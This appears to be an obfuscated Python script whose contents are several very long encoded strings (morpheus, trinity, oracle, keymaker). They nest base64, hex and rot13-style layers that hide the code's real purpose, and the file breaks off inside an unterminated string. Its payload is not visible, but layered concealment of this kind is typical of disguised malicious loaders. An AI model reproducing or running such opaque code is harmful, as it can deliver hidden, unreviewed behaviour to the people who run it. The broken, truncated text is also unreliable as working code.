import base64, codecs

morpheus = 'aW1wb3J0IGJhc2U2NCwgemxpYiwgY29kZWNzLCBiaW5hc2NpaSwgc2l4Cgptb3JwaGV1cyA9ICc2NTRhNzk3NDY1NzQ3NDc5NmYzMDcxMzIzNzY2NzYzNjY5NzY1NjU3MzM1ODQ1MzY2NDZlNDM1MjMzNDg2MjQ1Mzc2ODRmNTI0YjY4NDE2YjQ5Njk1NTZhMzA0MzMyNmE1ODMyNTI0YjZjNjc1NjQzNDE3MjY0NmM0MTU2MmIyZjc4MzA2ODYzNzEzMTYyNzYzNjQ0Njg1MDM1MzA0NzQyNjc2MjdhNGQ0ZjY1NTk3NDM1Mzg0MzZlNzE3MjM2MmI2NjJmN2EyYjczNzYyZjU4MzQ1NzQ4MzA3NDM5MmY3YTM2MzQzOTQ0MmY3MTJmNjY2NjcxNzU3NTM3MmY1ODYyMzQ2NjYxNzYzMzJmMmY3ODJiMzc2NjM5Nzg3MjM2MmY3NTRhNDU2YzY3MmI2Nzc0NjQzMTYyNGYyZjUwNzYzOTY1NGI2YTYxNjU2ZTY1MzY0ODMzNjY0ZjU1MzY2YjMzMzg3YTM3MmI1MDZhNmU3NDRlMzI0ZjM4NmUzOTY2MzczOTQ4Mzc0ZDZlNjY1MDZmMmIzNzQ4MmI3NzRjN2EzNzUwNmM2YTYyNjU1MzY1NjUzNTQ4NjUzODdhNWE1YTc2MzgzNzM1MzAzNTM5Mzc0YjZlNTE2NjM0NjU2NjZjMzQzMzc2NzYzOTc3NzQ3NTRlMzUzNTZjNzkzNTczNTU0Zjc2Mzg1MjY1NjU0MTcyNzY0NTZkNjY3NTcxNTgzNzY1NDgzMzc2NTY3MjJmNzAzNTY3NjIyYjM5NzA0YTM4NDg3NTQ3NjEzNzQ0NmQ3NjY3MmY2MjRiNjM1YTM0NmIzNzM3MzE2Mzc0MzE2ZTU1NTc1NzU5NGMzMTZjNGI0ZjRjMzk2NDczMzg1MzQ3Nzg1NjU5NDkzMTcxMzU3OTcyNzU1NzJiN2E3MzU4NWE1YTc3NTA1Nzc2NTg0YjMyNzQ2NTZjNGU2MTc1NTM0YzcwMzU2ZTdhNmE2MTM0MmY3MTM1NGY3OTJmMzA0NzU4NzY1YTY2NDQ2Mjc2NjQzNDM0NzE1NjRiNjYzNjMzNDY2Yzc3NmU3OTRiNDI2ZTQ0MmY2NTM1NzA2Yzc2NGIzMjM5MzU3ODZlN2E0OTZiMzc2NjdhNTE0YzcxNGM0YzRjNjY2ZDZhNmIyYjM1NDk0OTY2NDU3NTcyNzY1MjUwNDM3NjM3NTI2MTVhNjE0OTMzNjU3NjYyNDY3ODY0MmY2YzU0NzYzNDM0NjUzMTRiNzc2ZDM1NjQyZjU5MzgzODQyMzI2NDcxNjI0ODcxNmEzMTY4NDg2YTYzN2E3YTQ5NzI2MzU2MzU0OTYxMzg0OTdhNTg0ZDYyNTI1Njc4NGI3YTU0MzI1NjM5NjE0Mzc1NDI1MTcyMzQ0YTRiNGQ0OTQzNzY0NzUyNTM2NTRkNGEzMDM0NzU3MjczNDM1MDYzNjc0NDRjNDQ0YzY4Njk0ODRmNTMzODUxNzkzNjQ4NjMzNjQ3NDg1MTdhNzk2ODZjN2EzMzMzNjQ3MDQ0NDI0MjM0MzQzNTM5NTM1NTQ3MzE0ZTY2NjE1YTY0Njk2ZTU0MzM3MjZjNTk2NDMxNjU3NTRlNjc1MDYzNmM0YzJiNDg1NzU3MzMzNTZjNmM1NTUxNTYzOTYyNWE1ODc3NDc2NTU0MzAyYjZmNzg3NzRhMzk0ZTMxNWE0ZjY3NGQyYjZjNDE1ODM0N2E1OTZkNmU3MzYzNjM0YjY1NmQ0YjY2NTE3NTQ5MzkzODQzMzE2NzY2Mzk3MTM4NmMzNzQxNGM3ODJmNmU2NDZhNzMzODM4MmI2NzRlNmI3MTc5NTQ3Njc4MmY1MDRiNzQzMjZkMzc3NTU4NjUzMDZhNTIzMDdhNTM2NDMzNDgzODQxMzEzNzUxNjI3ODcwNGYyYjRkNTA0ZjY2NjI0ODY2NTM2MTY0NmU2NjQ1NDQzMjRjMmI0ODY2Nzc1NjQ3NmU2ZjcxMmI2Zjc3NzI0OTQ2NTU2NzRjNzU0NzQ2NjQzNzRhMzA2YzMxNzQ3NzcyNmU1MjMzMzk0YjM0NGU2NjVhNGQ1MTRhNDc1MDU3MzgzMDZiMzQyZjMzNmQ0MTU4MzQ0YjZiNzg0ODJmNjE2ZDU4NjMzMDM2NzU0ZDYzMmI3NTZiNmE2Zjc0Mzc2ODUwNzY3MjQzNDU0ODU5MzE2NDZjNzk1Njc4MzE0ZDQxNTA2NjY3NGEyZjY3NTMzMzM2NmU0ODM0NGI3NTU4NjE1Nzc5NmY0MzQ4NjQ3YTUxMmI2ODc2NjY3NzU0MmY2ODY4NmI1ODRlNjQzNDRiNTE3MzQ0NTE3OTQyNmIzMjUwNmIzMzc2Njk1MTZjMmY3MzZjNGM3NDYxNDI0YzU1NzQ2NzcyNTU3NTczNTIyZjc4Njg0YzM5Njk3NjM1MzczMDY5MzM3NjQxNTQ2OTYyNmUzNTc5NGQ2NzQ4NjYzNDRhMmY2NDYyNzA1OTU5NjYzMjU2NDI1NDZiNzg3NDM3NTE1YTY0MmY0MTZlNjgzMzUwNmQ0ODc2NDY2MTU1NTEzNzQ1NDQzNjM4NGEzODYxNDMzOTY4MzM2NzQzNTA3MjQ0MzM0MzU4NDY0NDJmNzgzMTUyNGM2Zjc3NDg0NDcyMzQ0NDJiNzg0MjJmMmI2YTJmMzE1MTMxNzc2YzMzNGIzODMzNjQ2ZjQ2NzQ1NjYyNTk2OTZjNzM0MTY2Mzg3MzQ0MmY0ZTQ3NGYzMjc3NDY2Nzc2Njc1YTc4MzQ2YzdhNDYyYjZkNTI2MzUzNzk2ZDc2NTAzNjY2Mzg2ZDZhNmY0NjdhNGM3ODY4MzM0MjY1N2E1MDUwNDc0MTUyMzMzNDU3MzMzNjZmNzk1MDMwNzgyYjQzNjg0ODcwNjkyZjc4MzMzODUyNDkzMTcwNTAyYjY4MmY0MjMxMzY3NzcwNjE0YjJmNTE3OTM3NzM2NzdhNjg2MTVhNDY2OTZlNDYyZjUyNTIyYjY5NjQ3NzcwNzYzNDM3NzgzODUxMzYzNTRkNTgzNjQ5MmI2MTQ2NGY2NTMwNGI2NTMwNDEyZjM1Njk2NjU5NDg2NjYyNGI2MTQ2NjYzNjM4NDc3Mjc3NTc1YTRmNTQ0NTczNTkzNTM5NDc2NDY1Nzk0YzQ1NGY3ODZjNTM3NzQ3NjU0ZDZiNGYzMjQ5NzMzNzRhNDc1NjMzNGEzOTM0NGYzODU5NTA2ZjY2NzU0ZjY0NjczNDU5NmEzOTc4MzM0ZTY2Njg3ODQ5NDQ3NjZhNTIyZjMyNGI2NTRmNGUzOTQxNzIzMDY4NDQyYjYzNjE1MDdhNjg3OTY2NjU1OTJmNzk0OTU2Mzg2NzZlNzk2ODc1NGMzNzQyNmEzMzZiNTA2NTc0NTAyZjY5Nzk1MDZhNjk3MjYxNDYyZjJiNjc0MzM5NzI0NTQ3MmIzODRlNjY2NTM0NGY0Yzc3MmY3YTQ2MmY0ZDRlMzg3OTU4Nzc0MjUwMzQ1NTY2Mzc3NTQzNjY0Mjc0Mzk2NTQ3NTYzMzY4NmU3YTMzNzg3NzZlNzI1NTMzN2E0ZTM0NmE2ODQxNzY2OTQ1NzY2YjU3NzM2ODZjMzk0ZDU4MzQ0MjU4MzA1MzM5NmM0YzQ1NzU2MTY0MmYzNTcwNTE1ODJiNTM2ZTc2NGI2NTY1NGYyYjYxNjM3NjQ1NjE2NTUxNGI3ODUwNTE0MTM5NjY0MzM1NDg3NjM2NDU3NTRhN2E2OTU4Nzc0YzMzNDQ0ZTY5NGI0YzM3Njk0MjcyNWE2YzJmNzM2YjQ1Mzg2OTZhNzk1MTRkNjEzODY3NGU2YTRhNDI1MDUyNDE1MDQxNTEyYjJmNTIyZjc4NjM0NzU0Mzg0ZDY1NjE3NzUwNmQ0OTQ4NjQ1OTRiMmI0ZDRiNjU1MDM5Mzg1MjRmNzc1NjJiMzQ3MjMyMmI2Mjc2NDkzMjM0NTE2MjdhMzA3YTQzNGQ2ZDUwN2E0MTUwNGQ2ZDM5Mzc3YTRkNmU0YzQ1MmI0ZDRjNjY3MzY0Mzg0MjRhNzg2ZjQ3Mzg2YTUyNGQzMjM2NTE1MjM3NDMyYjc5NTM3NTZmNGM2NDY3NDQ2NjczNzgzNzM1NmM2NTU0NGE3YTQ1NjYyZjcwNDE2NDY4Mzk3NzQ5NGYzMjcxNTQzMjMxNjI0ZDZkMzc0MzU4NDc3NTcxNTE1NzU2NjU2YTYyNmE0MzUwNzc1NDM0NmQ1ODZmNjk3MjY4NGY3ODM0Mzc2YTQ0NGY0NzUyNzY3NzQ0NTEyZjM1NDY1NDU4NDk3OTQ1NTAyZjRhNzczNjQ2NjIyYjQ5NTI3NDczNTQ1NjJiNDQzMTdhNGY1MDMwNTIyZjY3NDEzODU0NTYzNjQ0NjY2ODU4NjkzMTM4NTI0NjQzNjY3NjZjNDkzMTRlNzY0NzQxMmI1NTZkNTg2ZDY5NTk0MjMwNDE0YzZlMzM0YTUwNDQ3MzY1Mzg2NzZhNjkzMjMxNzM0MjYyMzk1OTU2NTk0NTZlMzU2YTQzMzk2ZjZiMzMyYjU5NTQzNjQzNmE3ODU4MzI1NjM4NTY1MDZiNDU3MzY4NzQzNjY4NzY3OTZhMzg0NzZhNmY2OTMyNDE1OTM2NDU2ZjY4Mzg2YjJmNzc0OTRlNzg0NDdhNzU3NjM'
trinity =  '3AzH3AmEzAwL3AmEuAQp1ZwWvATRmAmIuZmZmZGH5AJR0MGDkZmp3AmWzZmL1AGZkZmx1ZGpjZmD0ZwHkAGR1ZGWvAGV0BQp5AQR1BQWzAQR2ZmZ3AmpmZGZ4A2R2LwDkAwH3LGHjATD2ZwquAwL0MQH4ZzL2ZwZ1Awt3BQHlZmH0AGExZmtmZQMuZzV1BGEyAmp3ZwEuAwL0BGp3Zmt3AwDlAmL3ZGHlZmN0ZGWzZmV0ZwMyZmH2LGH4A2R3AmD4ZmtmZmZ0Zmt2ZGL3ZzLmBGD1AQR2ZmLkAwZlMwMvAQZmBGp2AzV0MwWvAmN2LmWzAQV1ZQMuAGD0AGZ1AzH0BQL1AGxmBGZ2ZmD2BGp4AzHmZwHjAwx3ZwEvAwLlLwp4ATRlMwWvAmZ0AmpjATH2AwLkAwZ2ZmDkAwZmBQD4AQp0MwLmAGV1LGZ4AJR3AQEzAwZ1ZGLlZmx2LmD4AGH3AQH0ATRmZwLmAmN2LGL2AwD2MwquAmt2ZGMuAGL2ZmL3AGRlMwp3AmL0AGEyAmHmZwExZzV3ZmquZmR2AmD0AwD3AQHkAQt3ZmL1Zmp3BQDlZmplMwD5AQp0ZwEzZmD0ZwplAGR3LGquAmx3ZwExAmL1ZwpkAGp1ZmZ1AzR0BQZ0AQR0AGHmAwZ1ZGL5AwZ0MwEuZmx3BQLlZmHmAmHlAmN3BGH0AGN0MQZ4AQR0ZGZ4AmL1AmH5ZmpmZGD1ATL3ZwL5ATH1LGHlZmN1LGL2AwD2AwZkAzVmBQMuAmV3Zwp1AzZ2AwLkAGR3BQZ0Awp1ZQplAGD3AQMvAwL3Zmp4AQDmBGD2AGNmAwEzZmtmAQD4Zmp0ZmEzAzZ2ZwZmZmLmBGp0AmL0BQWvZzV2Lmp5ZzV3AGL4Amp1BGp2A2RmBGH3ZmL0ZGL0AwZ1AwZ5AwRmAQpkZmH3AQMvAwV1ZmEzAQZ2MQMzAGt1AwZkAmZ2MGZlAwt0LwZ5AwD2BGLkATR1AwWvAzLlLwL0AzH1BQMwAzR1BQH2AGL0MwZ1ATD2AmEwAQH1AGH3AGL3ZwL3AmL1ZwL1AGHmAGEzAwp2BQp0AzV1ZmZkAwD2AwH1AwD0MwHmAQD3BQH4ZmZ0BQZkAwZ2LmquAwV2MGH5AGVmZQplAQD2MQEuAQt1AwZjAmD0BQH2ATV0AmD0AwD1Amp3AGV2ZmDmZmV3LGEwAmNmAmH4AzZ2ZwZ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'
oracle = 'E2Nzc5NmE1MjRkNjI2ODQ0NzgzNzYyNDM2NTQ4NTk2Nzc1NTc0NjY5Njg3MTM2NGE0YTMzNDI3YTY1NmE2NjdhNzM1NzRiNDg3YTY3NDU2NDZiNTQzNjUyNjM1NTQxNDgzNTQxMzU2YTczNDMzODM3NjU1NDRhNmI1MTY1NDk2MTU2NmY2ZDY0NjI0OTU5NzU0MTc4MzA1MTRmNmE2ZDQ4NDg2NDcxNzU3NzRkNmQ2NTQ4NTkzMzcwMmY3MzZhNmI0YTQzNGUzMjQzNzU2YTY3MzM3NTYxNTE2NjM4NDU0ZjMyNTA0ZTc0NzczNjY5NjczNDMxNjY3Mzc1NGQ2NzM2NDc2ZjYxNGM3YTQzNTU1YTRjNDQ0OTc4NjU0YTM5NGE3OTdhNDE3YTM3NGYzNzRhNzg0MTU0NzMzMzZlNDY0NjY4MzI0NDZkNmIzNDU1Nzc0YTMzMzEyZjU5NGM1MTc5NGQ2ODYxMzc2NzYyNDU3MzYzNmE0YTcyNWE0ODUxNDczNzRlNjk1YTM5NDM1NzM3NDM0NDQ5MzI3Mjc1NmU2YjRiNTM0ZDM3MzQ0OTQxNGQ0YjQ0NzM1MTdhNjk1MDQ0Nzc0NTM2NDg0ODYxMmY3MDUyNTA2NzYzNDg1MjY3MzY3MzczNzAzMDY5Njg2OTUwNTQ2OTQ1NmEzMDM1NjU1MTQ5NTIzMjU0NGY1NjQ0NDY0OTQyNjMzNjc0NjI3NjVhNDQ3ODMzNjQ1OTQxMzg3OTU3NGE3OTZlMzM3ODUxNWE2ZTY3N2EzNjVhNDc1MjU5MzI0YTQ3Njc0ZDdhNDQ1OTY2NmE0NTMyNzc0ODcyNmY2NjQxMzE2YTY5NmU1NzQ1NjI2MjQxNzg2NDY5NGU0NDc5NDEzNjYyNDg2NDcyNGI2NDQ4NDQ2ZjJmNGM0NDc2MzA0ZjZiNTk2NTM1NDY0MjU5NjU2NDQ3NDI3MTQyNjY2ZjZlNGU1NTc3NGE2ZDY0NjU0NDZiNzc0NjRhNmI1MDc2Nzc0NjZkNDczODZhNDQ1NDcwNGM0ZDVhNTk2MjRmNzA3YTRhMzI0ZjM1NDY3NDY3MmYzNzZmMzE0MzU0Mzg0MTc2NzQzNDRmMzQ3MzY0NzA3NDQ4NDQ3MzRkNmE2OTY5Nzc2YjZiNmIzMDQ2NmQ1NTQxMzc0ZDQ5MmI2NTdhNzUzNDRiMzg0MzdhNDk0ZDMzNzA0NzY0NjQ0ZDQ1NGY2YzUwNzE1MTczNTY2OTUxNzk2MTdhNmI3NzQ2NDIzNjRmNTg0MzQxNTA3NzQzNTg3NTYyNjM0NTRjNjk1NzVhNDI0ZDRlNzM3NzcxMmY0YTQ3NGE0YTVhNzM2Yjc3NDg1MzMwNTk3MTRkNDU3NzQ0MmY1YTM1NGQ0NzY1NTI2YTY4MzU1OTUxNTIyZjY3NDgzNTQzNTI1NDYxNjI3MDYzNGQ2OTMxNmI3MTZmNjk1ODM4NTI3NjQ4NGQ0NjU0NmYzNTRjNTI0ODY4NzA1MDc2NTQ1NzY2NGM1NDZlNzY0NTU0NmM3NTU0NjU1MzY3NGQyYjMzNmEyZjM4NmQ0Zjc5Nzc2NTdhNjM1MjMwNTk2NTRkNjc2YTQ3NDI3NTc3MzQ1NjU3Mzg1OTRmMzg0ZTRkNGM1NTMyNmU2MTdhNzA3NjU5NzgyZjU5NDYyZjQ5NzQzNjRmMzgzOTM0MzQzNjRkNzY1ODUyNGQzMTMxMzQ1YTY0NzM3NzMyNmE0MjcyNmM1OTY3NjQ1MDUyNjk3MjY3NzY2Zjc3MzM3NzJiNmY1MDU0NDI1NTVhMzk1NzcwNmU0NzU5NjI1ODRkNDg0YTU5NTAzOTY3NWE3MDczMzA3NzcwMzY1OTU0MzU2ODYzNDE3OTQ3NzQ2Yjc4N2E3OTUwNmE0NDU0Mzg0ZDc5NDQ2YTRmNmU1NDUxNjU0ZTM4NWEyYjM3NDQ3YTM3NmQ2YjM3NjQ3NjY2NmY2ZTQ5NmMyZjc0NTI3MTU5NGI2ZDRjNGQ2NTQzNmE1NTc3NTA2ODM0Mzc0YjYyNGEyZjQyNjk0NzQzNTg1OTZhNjczMDMxNDc1MzY3MzM3ODc3MzM2NzdhNjU3MDQyNzg0YTY5NTA0YTdhNzA2NDRkNDM0YTZjNDEzMjRiNTU2OTU1MzI2NTU5NjQ1NDRiMzc0NjY1NTY2OTMzNDY0Mjc2NjI1ODQxMzM2YTRjNDk3YTRkNDY1NzRhNTk2Njc3NTc2ODZlNDg0ZDc5NTc0MzRlNzU1MTM3NWE0OTY0NGU1YTY1Nzk1YTJiMzQ2MzJiNTE3MDUzNDQ0NDcxNjg2ODJmMzU2Yjc1NDQ0ZDZlNmQ0NTM2MzU0NDVhNGQzMzQ2NDM1YTZkMzAzMDM0NDU3NjU3NzY2ZDUzNjU0YjM4Njk0MTM3NTk2ZjZjMzQzODc4NTc2NzMxMzI0OTQ5Nzg2YjcxMzE3YTQ0NWE3NzUyNjU1NDUyMmI2MTRlNTQ0NTU2NTA1MjcwNGIzNjMwMzUzNTZiMzc3MDZjNDgyYjU5NTY0MTQ5NmEzNTRlMzM0YzcwNDQ1ODQ0NDg3NjU1NDczODc5NDM1NzUxNDE0NDRlNGU0YzM3NDI3YTZhMmYzODUzNDY3NTVhNTc0ZDQ1NTA0ZTMwNTI2YjU5NGI2NTQ2NTM0NzQ1NTU2MzJiNzk2MzZlNDU2YTU1MzA2NTZmNDQzOTU2NzEzNDQ2NGE1OTZkMzY2YzZlNjg2ZTdhNDczNTZiMzAzMjcwNzYyYjVhNjg2NzMzMzU0MjY2NmQ1MDdhNGE0NDY4NmY2Yjc0NzY3MDY5Njk2YTczNzk1ODc5NTE2NDQ0MzM2NzQ0MmI2Nzc2Njk1YTY1NDM1MjYyNTI2ZTM0NDQ2NTYzNmMzODMyNjQ0MTY1NmQ1NTUxNzkzOTM5NTQ2YTYxNDgyZjM1MzkzNDQxMzczNDc0NTE3NzcxNTk0ODc4NTUzODYzNzc2Njc2Nzg1MzZiNmU0NTY2NzI3MDczNTA3YTQ0NTAzMTRhNmQ0ZTYyNGQ0NTM3Njc3OTc3NDU1YTc3NmU3YTUxNzk3YTQyNzk3OTQ1NjQ2YjY2NzM2ZTczNjM1Mjc5NWE1NTY0NjE3MDM0NmI2ODQ3NjE2MzUyMzg3NTc4NzQ2OTc5Njk0NzdhNTI1OTVhNTU2ZDJmNmE0Yjc5NjM1MTYyNGE2YjM4NTg1YTQ3NGM0YTM1NGU0ZTc2NTI1NzJmNjk0YjcxNDQyZjY2NzUzMTUwNmM3NDc3Nzc1NTZjNjk3NjU5NDIzNTQ2NjY2NTQ5NTg0NzRlNTk0ODM1NmE3Nzc5NTE2ODZkNWE3NDU5NmEzNTc3NTQ1NjRkNDUyYjMxNDgzNTZmNmU0ZDZkNzM2MzM2NzcyZjc3NTA3NTJmNDM3MjQ0NjUzMTY1NzM0MzM3NTI0MjZiNjY3MTMyNTM2ZTdhNTI1MTY3MzQ0MjRkNTk0ZjU5Mzc0ZjUwNzE1NDQ1NmM0NzUzNTQ0NDRmNzE3MzczMmYyZjZkNDY3ODc1NTM1MjQ4NTc0ZjRlNTQ0YTM4MzMzNTQxMzM1NzQzMzc0YjU3Njk0Nzc1NDg1NDRhNjE2ZDU4MzA0ZDMyN2E1ODY1Nzc0ODM3MmYzODZkNTA2YTc3NzY3NjQxMzMzNjM4NGU1MDZkNjUyYjcwNmUzNjY2NzU2ODY3MzE2YTUwNzY0MzRmMzA0ZTc2NTU3ODMzMzczNDM0NmI0NDMyNmU1MDU5MzE2NjZkNmY0ZTU4MzU1NDM0NTI2NTcwNDkzMzc5NGY0NDY5MzMzMTY3NTAyZjcxNTg1OTUxMzQ1MjU0MzEyZjMyNGU3Mzc4NmQ1YTYyMzY2Nzc3NDkyYjU5NzQzNzZkNDg3MTUyNGQzOTM2NzI2ODcyN2E2ODY2NDE1MjRjNDU2NTc3NzQzOTMzNDI2OTc2NDY0Yzc3NmQ1NzRkNzYzNjQ2NjM2Njc5Nzk1YTM5NmE2ODMxNjQ2MzU4NGM2NjZmMzM3ODY3NTg0ZDM2MzQ3ODZjNzI0NDUwNmI0YjRlNjYzNDUxMzg1ODU5Nzk2ZjYzNzY2NjYzN2E0ODY4NmQ0NjQ3NDg0MjU3NzM0ZDM4Nzk2ZTRhNzY2NTRmN2E1YTY2NDU3Mjc5MzgyYjc4NzIzNDYyNGQ3NDdhNjM2YTMxMzk3MTZkNDQ1MDM1Nzg1OTQ0MzE3OTZhNDI3ODQ4NjU3NjU1MzQ0MTY1NDk2ZDMzMzQzMzRlNmU1OTc4NTgzMzZhMzQ2ODUzNTUzMzU4MmY0YTM0NDQ2ZjQ5Mzk2MjU0NGIzODc5NDkyYjQ0MzMzNTQyNGE1YTRlN2E3YTUwNGE1NTVhNTg0ZjY3NmU3ODQyNmUzNzJmNmU2NzdhNTg3YTQ0NGEzNDQ2NTk2ZDRjNmYzMTYzNTgzMzZiNjI2MzY5Nzk0YzY3NTc2ZTM5NzE2YjczNjU3NjdhNTM1NjcyNmY2ZTJmNjc3Mzc5NzU3MTY1NGQ0NDQxMmI2YjY0Njg3OTJiMzc1YTRkNmY0YzRkNzEzMTc5NzE0MTRlNmIzMTMwMzI2MzU1NTMzNDU0NGEzODQzNTY2NTYyNGYzMDdhNGE2NjQxNjc0Nzc3NzczODM0NGI1MjMwNzk0ODU0NGY1NDQ0NTU2OTQ2NzQ1NDM5MmY2YzQ2Njg1NzYzNGUyYjc0NzY3NTMyMzIyZjZjN'
keymaker = 'zL2ZGp2ZmVmAGL1AQp2AQHlZmN2ZGL1AGN2MGD3AGZ0MGDmAwD2LwHlAmx1AmpkATH1ZmL2AGV1ZGEuAwL0Zmp3AGH2MGWzAmL3AwMwAzV1ZwquAQVmAGplAmV2AwMzAwD0MQL2AGt0LwD0ZmV2MwZlAJR3ZGpmZmN2LGZ1AmHmAmH5ZmVlLwDmAmx3ZmEzAmx2AQHmZmt3AGD4ZmpmAmL1Awt0ZwEzZmtlLwMzAQLmZmL1AmV3ZGEwAzDmAmZkAQt2LmH5ATLmZGp5ZmLmAwZ4ZmD0MGZlZmN0LwMyAwH0MGH0AmHmAwLmAwH2LGD5Zmx3AGEwZmDmZwZlZmVmZGp1AQD1ZmH3AzH0AGZ1AzZmBGquAmx0MGHjAmH3BGp0ZmVmZGMuAGt1AGEuZmL0ZmIuATV0MwDmAmR0LmD0ZmN3Awp1AmL0AGH0AQD3LGD4ZzVmAQWzA2RmZGH1AQH0BQMyAwR3AmL0AQL1AGMwAQt3ZwplAmVmBQWvAmL2LmH1AQZ1AmL2A2R0AGMxAGt3ZQHmAmt1ZmMxAmVmAQZjAmD1Zmp4AQt2AQH2AzZ2AGplATV2AGHkA2R0Mwp